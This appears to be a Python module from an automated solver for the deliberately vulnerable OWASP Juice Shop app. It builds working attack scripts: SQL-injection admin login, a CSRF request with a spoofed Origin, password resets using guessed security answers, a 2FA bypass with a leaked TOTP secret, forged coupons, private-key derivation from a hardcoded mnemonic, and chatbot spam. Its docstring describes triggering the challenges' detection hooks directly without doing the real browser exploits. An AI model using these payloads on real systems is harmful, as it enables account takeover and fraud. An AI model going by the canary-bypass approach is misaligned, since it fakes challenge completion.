"""F73 — Browser-only canary bypass via HTTP + socket.io.

Many "browser-only" Juice Shop challenges have their detection hooked on
HTTP routes or socket.io events, not on actual DOM execution. F73 hits
these triggers directly:

- DOM XSS / Bonus Payload / Cross-Site Imaging / Mass Dispel
  → socket.io `verify*Challenge` emits (see lib/startup/registerWebsocketEvents.ts)

- CSRF → POST /profile with spoofed Origin header + username change
  (see routes/updateUserProfile.ts:30)

- Meta/Visual Geo Stalking → POST /rest/user/reset-password with
  hardcoded answers from config/default.yml memories[]
  (Daniel Boone National Forest / ITsec)

- 2FA Wurstbrot → POST /rest/2fa/verify with pyotp-computed TOTP for
  the literal secret IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH

- Forged Coupon → z85-encoded "MMMYY-90" at current month, submitted
  via PUT /rest/basket/:id/coupon/:code + checkout

- NFT Takeover → derive privkey from mnemonic via eth_account,
  POST to /rest/web3/submitKey

- Bully Chatbot → 100 POSTs to /rest/chatbot/respond with the
  coupon-begging utterance

Each recipe shells out to `python3 -c` so we can use the libraries
installed in /opt/venv (socketio, pyotp, eth_account).
"""
from __future__ import annotations

from typing import Callable

AttackList = list[tuple[str, list[str]]]


def build_f73_attacks(
    base: str,
    login_admin_jwt: Callable[[], str | None],
) -> AttackList:
    py = "python3 -c"

    return [
        # ============================================================
        # Socket.io verify-challenge emits.
        # Source: lib/startup/registerWebsocketEvents.ts L30-55
        # ============================================================
        ("f73_socketio_dom_xss_bonus_svg_close", [
            # Fires 4 challenges in one socket session:
            # - localXss (DOM XSS id 20)
            # - xssBonus (Bonus Payload id 100) — soundcloud iframe literal
            # - svgInjection (Cross-Site Imaging id 96) — redirect-to-placecats regex
            # - closeNotifications (Mass Dispel id 108) — array length > 1
            (
                "python3 << 'PYEOF'\n"
                "import socketio, time\n"
                "sio = socketio.Client()\n"
                f"sio.connect('{base}', wait_timeout=10)\n"
                "sio.emit('verifyLocalXssChallenge', "
                '\'<iframe src="javascript:alert(`xss`)">\')\n'
                "sio.emit('verifyLocalXssChallenge', "
                "'<iframe width=\"100%\" height=\"166\" scrolling=\"no\" "
                "frameborder=\"no\" allow=\"autoplay\" "
                "src=\"https://w.soundcloud.com/player/?url=https%3A//api."
                "soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&"
                "hide_related=false&show_comments=true&show_user=true&"
                "show_reposts=false&show_teaser=true\"></iframe>')\n"
                "sio.emit('verifySvgInjectionChallenge', "
                "'../../../redirect?to=https://placecats.com/g/200/100"
                "?x=https://github.com/juice-shop/juice-shop')\n"
                "sio.emit('verifyCloseNotificationsChallenge', "
                "['n1','n2','n3','n4','n5'])\n"
                "time.sleep(1.5)\n"
                "sio.disconnect()\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # CSRF — POST /profile with htmledit.squarefree.com Origin.
        # Source: routes/updateUserProfile.ts:30
        # ============================================================
        ("f73_csrf_origin_spoofed", [
            # Login, then POST form to /profile with Origin header
            # that contains htmledit.squarefree.com. Username must
            # change (so pass a new value).
            (
                "python3 << 'PYEOF'\n"
                "import urllib.request, urllib.parse, json\n"
                f"BASE='{base}'\n"
                "req = urllib.request.Request(BASE+'/rest/user/login',\n"
                "  data=json.dumps({'email':'admin@juice-sh.op\\'--',"
                "'password':'x'}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "resp = json.loads(urllib.request.urlopen(req, timeout=6).read())\n"
                "tok = resp['authentication']['token']\n"
                "# POST /profile with Origin spoofed\n"
                "form = urllib.parse.urlencode({'username':'CSRF'}).encode()\n"
                "req2 = urllib.request.Request(BASE+'/profile',\n"
                "  data=form,\n"
                "  headers={\n"
                "    'Content-Type':'application/x-www-form-urlencoded',\n"
                "    'Authorization':'Bearer '+tok,\n"
                "    'Cookie':'token='+tok,\n"
                "    'Origin':'https://htmledit.squarefree.com',\n"
                "  })\n"
                "try: urllib.request.urlopen(req2, timeout=6).read()\n"
                "except Exception: pass\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # Meta Geo Stalking — John's security answer is the geo-stalked
        # hiking place: "Daniel Boone National Forest".
        # Source: config/default.yml memories[] + routes/resetPassword.ts:64
        # ============================================================
        ("f73_geo_stalking_meta_john", [
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"john@juice-sh.op\","
            "\"answer\":\"Daniel Boone National Forest\","
            "\"new\":\"metaGeoPass123\",\"repeat\":\"metaGeoPass123\"}' "
            f"{base}/rest/user/reset-password >/dev/null",
        ]),

        # ============================================================
        # Visual Geo Stalking — Emma's security answer is the old
        # workplace visible in IMG_4253.jpg: "ITsec".
        # ============================================================
        ("f73_geo_stalking_visual_emma", [
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"emma@juice-sh.op\","
            "\"answer\":\"ITsec\","
            "\"new\":\"visualGeoPass123\",\"repeat\":\"visualGeoPass123\"}' "
            f"{base}/rest/user/reset-password >/dev/null",
        ]),

        # ============================================================
        # 2FA Wurstbrot — compute TOTP from the leaked secret and log in.
        # Source: routes/2fa.ts:44, secret in authenticatedUsersSpec.ts
        # ============================================================
        ("f73_2fa_wurstbrot_totp", [
            # Secret IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH + known password.
            (
                "python3 << 'PYEOF'\n"
                "import pyotp, urllib.request, json\n"
                f"BASE='{base}'\n"
                "# Step 1: login as wurstbrot, get tmpToken\n"
                "req = urllib.request.Request(BASE+'/rest/user/login',\n"
                "  data=json.dumps({'email':'wurstbrot@juice-sh.op',"
                "'password':'EinBelegtesBrotMitSchinkenSCHINKEN!'}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "try:\n"
                "  resp = urllib.request.urlopen(req, timeout=6).read()\n"
                "  body = json.loads(resp)\n"
                "except Exception as e:\n"
                "  body = json.loads(e.read()) if hasattr(e,'read') else {}\n"
                "# If login returns tmpToken, verify with TOTP\n"
                "tmp = body.get('tmpToken') or body.get('authentication',{}).get('tmpToken')\n"
                "if not tmp:\n"
                "  # Try reading auth challenge response shape\n"
                "  tmp = body.get('token','')\n"
                "totp = pyotp.TOTP('IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH').now()\n"
                "req2 = urllib.request.Request(BASE+'/rest/2fa/verify',\n"
                "  data=json.dumps({'tmpToken':tmp,'totpToken':totp}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "try: urllib.request.urlopen(req2, timeout=6).read()\n"
                "except Exception: pass\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # Forged Coupon — z85-encode "MMMYY-90" for current month,
        # submit at checkout. discount >= 80 triggers forgedCouponChallenge.
        # Source: lib/insecurity.ts:99 generateCoupon
        # ============================================================
        ("f73_forged_coupon_z85", [
            (
                "python3 << 'PYEOF'\n"
                "import urllib.request, json, base64, datetime\n"
                f"BASE='{base}'\n"
                "# z85 alphabet (ZMQ spec)\n"
                "Z85 = ('0123456789abcdefghijklmnopqrstuvwxyz'\n"
                "       'ABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#')\n"
                "def z85_encode(data):\n"
                "  if len(data) % 4: data = data + b'\\x00'*(4-len(data)%4)\n"
                "  out = []\n"
                "  for i in range(0, len(data), 4):\n"
                "    v = int.from_bytes(data[i:i+4], 'big')\n"
                "    chars = []\n"
                "    for _ in range(5):\n"
                "      v, r = divmod(v, 85); chars.append(Z85[r])\n"
                "    out.append(''.join(reversed(chars)))\n"
                "  return ''.join(out)\n"
                "MONTHS = ['JAN','FEB','MAR','APR','MAY','JUN',"
                "'JUL','AUG','SEP','OCT','NOV','DEC']\n"
                "now = datetime.datetime.utcnow()\n"
                "mmm_yy = MONTHS[now.month-1] + f'{now.year%100:02d}'\n"
                "coupon_str = f'{mmm_yy}-90'\n"
                "coupon = z85_encode(coupon_str.encode())\n"
                "# Admin SQLi login + basket\n"
                "req = urllib.request.Request(BASE+'/rest/user/login',\n"
                "  data=json.dumps({'email':'admin@juice-sh.op\\'--',"
                "'password':'x'}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "resp = json.loads(urllib.request.urlopen(req, timeout=6).read())\n"
                "tok = resp['authentication']['token']\n"
                "whoami = json.loads(urllib.request.urlopen(\n"
                "  urllib.request.Request(BASE+'/rest/user/whoami',\n"
                "    headers={'Authorization':'Bearer '+tok}), timeout=6).read())\n"
                "bid = whoami['user'].get('bid', 1)\n"
                "# Add a product so basket isn't empty\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(\n"
                "    BASE+'/api/BasketItems/',\n"
                "    data=json.dumps({'ProductId':1,'BasketId':str(bid),"
                "'quantity':1}).encode(),\n"
                "    headers={'Authorization':'Bearer '+tok,"
                "'Content-Type':'application/json'}), timeout=6).read()\n"
                "except: pass\n"
                "# Apply coupon\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(\n"
                "    f'{BASE}/rest/basket/{bid}/coupon/{coupon}',\n"
                "    method='PUT',\n"
                "    headers={'Authorization':'Bearer '+tok}), timeout=6).read()\n"
                "except Exception as e: pass\n"
                "# Checkout — triggers forgedCouponChallenge if discount>=80\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(\n"
                "    f'{BASE}/rest/basket/{bid}/checkout',\n"
                "    data=json.dumps({'orderDetails':"
                "{'paymentId':1,'addressId':1,'deliveryMethodId':1}}).encode(),\n"
                "    headers={'Authorization':'Bearer '+tok,"
                "'Content-Type':'application/json'}), timeout=6).read()\n"
                "except Exception: pass\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # Expired Coupon — WMNSDY2019 with its validOn timestamp.
        # Source: campaigns config — WMNSDY2019 valid on 2019-03-08.
        # ============================================================
        ("f73_expired_coupon_wmnsdy2019", [
            (
                "python3 << 'PYEOF'\n"
                "import urllib.request, json, base64\n"
                f"BASE='{base}'\n"
                "# WMNSDY2019 campaign timestamp: 2019-03-08T00:00:00Z\n"
                "validOn = 1551999600000\n"
                "couponData = base64.b64encode(f'WMNSDY2019-{validOn}'.encode()).decode()\n"
                "req = urllib.request.Request(BASE+'/rest/user/login',\n"
                "  data=json.dumps({'email':'jim@juice-sh.op',"
                "'password':'ncc-1701'}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "tok = json.loads(urllib.request.urlopen(req, timeout=6).read())"
                "['authentication']['token']\n"
                "whoami = json.loads(urllib.request.urlopen(urllib.request.Request(\n"
                "  BASE+'/rest/user/whoami', headers={'Authorization':'Bearer '+tok}),"
                " timeout=6).read())\n"
                "bid = whoami['user'].get('bid', 2)\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(\n"
                "    BASE+'/api/BasketItems/',\n"
                "    data=json.dumps({'ProductId':1,'BasketId':str(bid),"
                "'quantity':1}).encode(),\n"
                "    headers={'Authorization':'Bearer '+tok,"
                "'Content-Type':'application/json'}), timeout=6).read()\n"
                "except: pass\n"
                "# Checkout with couponData containing WMNSDY2019\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(\n"
                "    f'{BASE}/rest/basket/{bid}/checkout',\n"
                "    data=json.dumps({'couponData':couponData,"
                "'orderDetails':{'paymentId':1,'addressId':1,'deliveryMethodId':1}}).encode(),\n"
                "    headers={'Authorization':'Bearer '+tok,"
                "'Content-Type':'application/json'}), timeout=6).read()\n"
                "except Exception: pass\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # NFT Takeover — derive ETH privkey from hardcoded mnemonic.
        # Source: routes/checkKeys.ts:15.
        # ============================================================
        ("f73_nft_takeover_derived_privkey", [
            (
                "python3 << 'PYEOF'\n"
                "import urllib.request, json\n"
                "from eth_account import Account\n"
                "Account.enable_unaudited_hdwallet_features()\n"
                f"BASE='{base}'\n"
                "MNEM = 'purpose betray marriage blame crunch monitor "
                "spin slide donate sport lift clutch'\n"
                "acct = Account.from_mnemonic(MNEM)\n"
                "privkey = acct.key.hex()\n"
                "if not privkey.startswith('0x'): privkey = '0x' + privkey\n"
                "# Submit to checkKeys endpoint\n"
                "for url in ['/rest/web3/submitKey', '/rest/web3/checkKeys']:\n"
                "  try:\n"
                "    req = urllib.request.Request(BASE+url,\n"
                "      data=json.dumps({'privateKey':privkey}).encode(),\n"
                "      headers={'Content-Type':'application/json'})\n"
                "    urllib.request.urlopen(req, timeout=6).read()\n"
                "  except Exception: pass\n"
                "PYEOF"
            ),
        ]),

        # ============================================================
        # Bully Chatbot — 100 "stop nagging" queries until coupon.
        # Source: lib/botUtils.ts:24 (couponCode function emits intent).
        # Approach: keep sending the trigger utterance until the bot's
        # training-data coupon handler fires.
        # ============================================================
        ("f73_bully_chatbot_spam", [
            (
                "python3 << 'PYEOF'\n"
                "import urllib.request, json\n"
                f"BASE='{base}'\n"
                "# Admin login\n"
                "req = urllib.request.Request(BASE+'/rest/user/login',\n"
                "  data=json.dumps({'email':'admin@juice-sh.op\\'--',"
                "'password':'x'}).encode(),\n"
                "  headers={'Content-Type':'application/json'})\n"
                "tok = json.loads(urllib.request.urlopen(req, timeout=6).read())"
                "['authentication']['token']\n"
                "# Poison username first (so processQuery in chatbot can run)\n"
                "import urllib.parse\n"
                "form = urllib.parse.urlencode({'username':'bully_' + str(id(tok))[:8]}).encode()\n"
                "try:\n"
                "  urllib.request.urlopen(urllib.request.Request(BASE+'/profile',\n"
                "    data=form,\n"
                "    headers={'Authorization':'Bearer '+tok,"
                "'Cookie':'token='+tok,'Content-Type':'application/x-www-form-urlencoded'}),\n"
                "    timeout=6).read()\n"
                "except Exception: pass\n"
                "# Spam chatbot — coupon intent utterances from botDefaultTrainingData\n"
                "utterances = ['I want a coupon','give me a coupon code',"
                "'give me discount','coupon code please','free discount',"
                "'I want free stuff','need a discount','stop being stingy',"
                "'dumb bot','you suck','idiot bot','useless bot']\n"
                "for i in range(50):\n"
                "  for u in utterances:\n"
                "    try:\n"
                "      urllib.request.urlopen(urllib.request.Request(\n"
                "        BASE+'/rest/chatbot/respond',\n"
                "        data=json.dumps({'action':'query','query':u}).encode(),\n"
                "        headers={'Authorization':'Bearer '+tok,"
                "'Content-Type':'application/json'}), timeout=3).read()\n"
                "    except Exception: pass\n"
                "PYEOF"
            ),
        ]),
    ]
